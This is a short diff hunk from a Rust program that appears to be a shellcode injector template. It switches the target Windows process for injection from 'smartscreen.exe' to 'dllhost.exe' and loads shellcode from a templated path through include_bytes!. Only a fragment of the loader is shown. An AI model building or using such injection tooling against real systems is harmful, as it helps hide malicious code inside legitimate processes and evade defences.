@@ -61,7 +61,7 @@ fn enhance(buf: &Vec<u8>, tar: &u32) {
 
 fn main() {
     // inject in the following processes:
-    let tar: &str = "smartscreen.exe";
+    let tar: &str = "dllhost.exe";
 
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     let mut vec: Vec<u8> = Vec::new();
